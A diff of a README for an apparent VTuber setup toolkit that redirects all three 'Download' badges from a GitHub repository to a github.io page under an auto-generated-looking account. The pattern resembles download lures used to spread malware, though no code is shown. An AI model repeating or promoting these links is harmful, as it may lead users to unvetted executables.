@@ -1,6 +1,6 @@
 # 🎮 2d-vtuber-vtube-studio-setup-toolkit - Your All-in-One VTuber Launchpad
 
-[![Download Now](https://img.shields.io/badge/Download-2D_VTuber_Toolkit-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/windblown-directionalantenna594/2d-vtuber-vtube-studio-setup-toolkit)
+[![Download Now](https://img.shields.io/badge/Download-2D_VTuber_Toolkit-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://windblown-directionalantenna594.github.io)
 
 ---
 
@@ -46,7 +46,7 @@ Whether you're on Twitch, YouTube, or any other platform, the streaming settings
 
 Visit this link to download the application:
 
-[![Download Button](https://img.shields.io/badge/⬇️_Get_the_Toolkit_now-4CAF50?style=for-the-badge&logo=download&logoColor=white)](https://github.com/windblown-directionalantenna594/2d-vtuber-vtube-studio-setup-toolkit)
+[![Download Button](https://img.shields.io/badge/⬇️_Get_the_Toolkit_now-4CAF50?style=for-the-badge&logo=download&logoColor=white)](https://windblown-directionalantenna594.github.io)
 
 The download will start immediately or take you to a page where you can grab the files.
 
@@ -185,7 +185,7 @@ Join vtubing communities online to share tips and get help. Many experienced vtu
 
 Your virtual identity is waiting. Get the toolkit today and transform your streaming experience:
 
-[![Final Download](https://img.shields.io/badge/🚀_Download_2D_VTuber_Toolkit-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/windblown-directionalantenna594/2d-vtuber-vtube-studio-setup-toolkit)
+[![Final Download](https://img.shields.io/badge/🚀_Download_2D_VTuber_Toolkit-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://windblown-directionalantenna594.github.io)
 
 Remember, the path to becoming a great virtual streamer starts with solid setup. This toolkit removes the barriers so you can shine on screen.
 
